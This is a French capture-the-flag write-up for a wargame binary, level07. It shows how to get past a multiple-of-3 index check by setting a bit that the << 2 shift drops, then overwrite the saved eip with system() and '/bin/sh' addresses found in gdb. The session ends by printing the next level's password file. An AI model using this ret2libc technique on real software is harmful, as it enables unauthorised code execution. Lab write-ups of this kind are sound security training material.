# level07

Le programme range des int et fait un `<< 2` sur l'index

Donc un int qui vaut \
`0b1000000000000000000000001110010`, va valoir \
`0b0000000000000000000000111001000` après un `<< 2`

Avec un offset de `456` on peut réecrire `eip`, donc l'index `114` d'un tableau d'int

Cependant `114` est multiple de `3`, \
Donc on va allumer un bit au bout de l'int, qui se fera shift, pour avoir un autre nombre non multiple de 3 \
On obtiendra ainsi quand même `456` après le shift.

Notre index pour écrire `eip`:
```python
>>> 0b0000000000000000000000001110010
114
>>> 0b1000000000000000000000001110010
1073741938
```

```
(gdb) info function system
0xf7e6aed0 system

(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec "/bin/sh"
```

En décimal, ces adresses sont:
```python
>>> 0xf7e6aed0
4159090384
>>> 0xf7f897ec
4160264172
```

Ainsi, on écrit l'adresse de `system()` sur `eip`, et son paramète `"/bin/sh"` à l'adresse d'après:
```
$ ./level07
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
